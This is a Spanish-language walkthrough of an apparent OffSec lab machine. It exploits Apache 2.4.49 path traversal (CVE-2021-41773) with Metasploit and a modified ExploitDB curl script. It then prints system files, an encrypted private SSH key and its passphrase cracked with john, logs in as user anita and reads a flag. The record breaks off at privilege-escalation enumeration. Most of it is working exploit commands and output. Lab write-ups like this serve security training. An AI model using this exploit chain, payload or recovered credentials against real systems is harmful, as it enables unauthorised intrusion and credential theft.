[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 4 hops
[*] Nmap: Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE (using port 111/tcp)
[*] Nmap: HOP RTT       ADDRESS
[*] Nmap: 1   238.85 ms 192.168.45.1
[*] Nmap: 2   238.89 ms 192.168.45.254
[*] Nmap: 3   238.91 ms 192.168.251.1
[*] Nmap: 4   239.00 ms 192.168.231.245
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds
msf6 auxiliary(scanner/http/http_version) > back
msf6 > services
Services
========

host             port  proto  name      state  info
----             ----  -----  ----      -----  ----
192.168.231.245  21    tcp    ftp       open   vsftpd 2.0.8 or later
192.168.231.245  80    tcp    http      open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.231.245  443   tcp    ssl/http  open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.231.245  2222  tcp    ssh       open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 Ubuntu Linux; protocol 2.0
192.168.231.245  8000  tcp    http      open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8

msf6 > vulns

Vulnerabilities
===============

Timestamp                Host             Name                     References
---------                ----             ----                     ----------
2025-06-05 19:53:16 UTC  192.168.180.249  Generic Payload Handler

msf6 > hosts

Hosts
=====

address          mac  name             os_name       os_flavor  os_sp  purpose  info  comments
-------          ---  ----             -------       ---------  -----  -------  ----  --------
192.168.180.249       LEGACY           Windows 2022                    server
192.168.231.245       192.168.231.245  Linux                    5.X    server

msf6 > 
```

2. Buscamos y confirmamos por **path traversal**
```bash
msf6 auxiliary(scanner/http/apache_normalize_path) > set CVE CVE-2021-41773
CVE => CVE-2021-41773
msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS 192.168.231.245
RHOSTS => 192.168.231.245
msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 80
RPORT => 80
msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGETURI /cgi-bin
TARGETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[+] http://192.168.231.245:80 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
> Por defecto ejecutamos la accion para buscar por **_Path Traversal_** 

```bash
msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS 192.168.229.245
RHOSTS => 192.168.229.245
msf6 auxiliary(scanner/http/apache_normalize_path) > set CVE CVE-2021-41773
CVE => CVE-2021-41773
msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 80
RPORT => 80
msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGUETURI /cgi-bin
[!] Unknown datastore option: TARGUETURI. Did you mean TARGETURI?
TARGUETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGETURI /cgi-bin
TARGETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set ACTION CHECK_RCE
ACTION => CHECK_RCE
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[-] http://192.168.229.245:80 - The target is not vulnerable to CVE-2021-41773 (requires mod_cgi to be enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > set ACTION REED_FILE
ACTION => REED_FILE
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[+] http://192.168.229.245:80 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > 
```
> Podemos ver que **192.168.xxx.245** no es vulnerable a RCE porque no hay un cgi valido activo.

3. Explotamos **192.168.xxx.245**
   * Buscamos en [exploitDB](https://www.exploit-db.com/exploits/50383)
   * Modificamos el exploit a nuestras necesidades:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# cat 245-poc.sh                   
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
    echo "Uso: $0 [TARGETS.TXT] [PATH] [COMMAND]"
    echo "Ejemplo: $0 targets.txt /bin/sh whoami"
    exit 1
fi

TARGETS=$1
PATH_TO=$2
CMD=$3

for host in $(cat "$TARGETS"); do
    echo "[*] Atacando $host..."
    RESPONSE=$(curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $CMD" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$PATH_TO")
    echo "$RESPONSE"
    echo "-----------------------------------"
done
```
- **Ejecutamos**

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/passwd ""
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: -z: not found
./245-poc.sh: 12: -z: not found
[*] Atacando 192.168.231.245...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
-----------------------------------
```

#### Usuarios de 192.168.xxx.245:

```bash
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
```

> Muchos doritos despues tras un proceso de enumeracion

```bash
# primer indicio positivo de direccion de busqueda
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/ssh           
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.229.245/cgi-bin/../../../../../../../../../../etc/ssh/">here</a>.</p>
</body></html>

# archivos de configuracion ssh
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/ssh/sshd_config         
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile .ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/ssh/ssh_config 
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
```
#### Accedemos a claves publicas y archivos de configuracion:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/group              
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,offsec
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:offsec
floppy:x:25:
tape:x:26:
sudo:x:27:offsec
audio:x:29:
dip:x:30:offsec
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:offsec
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:offsec
systemd-coredump:x:999:
offsec:x:1000:
miranda:x:1001:
steven:x:1002:
mark:x:1003:
anita:x:1004:
apache:x:998:anita
ssl-cert:x:117:
ftp:x:118:
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/hosts
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
127.0.0.1 localhost
127.0.1.1 web01

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/crontab
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/hostname
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
web01
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/shadow  
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/environment
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/profile    
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/issue  
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
Ubuntu 20.04.5 LTS \n \l

                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /etc/ssh/ssh_host_rsa_key.pub
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkRPaVboTfq+VZYyf1bsUlg+WZrPP1F6fRrA0TNkHmamfuFAhW9XfCiuh2GOnSkNeGUXLcMAgMtbki6uj4l6vTw5/pqM/jBz00be6Ty+g0CDz9gmb+p0iX+8vCeG6aB0vea9bvkjaABticCS1CmUEbfEe/jCn/11c4NmHleCFfVxE8PBRE2OyVWlFQkkcB74O0FS4AOfbnrAx3pAF4rcd7XsTgi4V1e/sKZ8RIcTlueVdnzZEMcpLeZXUR1cXsJ9zwklFLuMWuUjonYC7BFvT+Bf81jlO1/e9B0RxfalfCfeUthSoa2VGwpfvesCdHl0exvy1PXaeR2XUX5ZJ0jmoP7cvj1rb+ZrnUU/Sie0qpVklHpkjggz0li7Mk4h/CI+est9oeHP+UXVv+Xl/jpnXz/RX/1y03wkTe9Pygxo3NsLdrs22/UCQ5GZ5x78UJQBXCCI93KHY1BG28B9V8xT9PGmpFDgjnF3pFuZoMevmeHSVNBlNQV42/qFCJr48XbAM= root@web01
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /home/anita/.ssh/authorized_keys
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /home/anita/.ssh/id_rsa
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /home/anita/.ssh/id_ed25519
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

# Obtenemos el id_ecdsa
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ./245-poc.sh targets.txt /home/anita/.ssh/id_ecdsa
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# nano id_ecdsa_anita                  
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# nano id_ecdsa_anita
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# chmod 600 id_ecdsa_anita
```

#### Crackeamos con john:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# /usr/share/john/ssh2john.py id_ecdsa_anita > id_ecdsa_anita.hash 
                                                                                                                                         
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# cat id_ecdsa_anita.hash              
id_ecdsa_anita:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e6973743235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0f7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183
                                                                                                                                         
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# rm -rf id_ecdsa_anita.hash  
                                                                                                                                         
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# /usr/share/john/ssh2john.py id_ecdsa_anita > id_ecdsa_anita.hash
                                                                                                                                         
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# john id_ecdsa_anita.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fireball         (id_ecdsa_anita)     
1g 0:00:04:37 DONE (2025-06-07 21:39) 0.003606g/s 14.77p/s 14.77c/s 14.77C/s musical..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Nos conectamos por ssh al usuario anita:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/245-machine]
‚îî‚îÄ# ssh -i id_ecdsa_anita -p 2222 anita@192.168.229.245
Enter passphrase for key 'id_ecdsa_anita': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 08 Jun 2025 01:17:08 AM UTC

  System load:  0.0               Processes:               150
  Usage of /:   67.2% of 7.77GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 192.168.229.245
  Swap usage:   0%


284 updates can be applied immediately.
217 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Nov 11 12:06:55 2022 from 192.168.118.2
$ ls
local.txt
$ cat local.txt
c784533ef1e4c4f51b572cfeb22c9709
$ 
```
#### Escalar privilegios en WEB01

1. Enumeramos y exporamos el primer vector

```bash
$ uname -a
Linux web01 5.4.0-128-generic #144-Ubuntu SMP Tue Sep 20 11:00:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
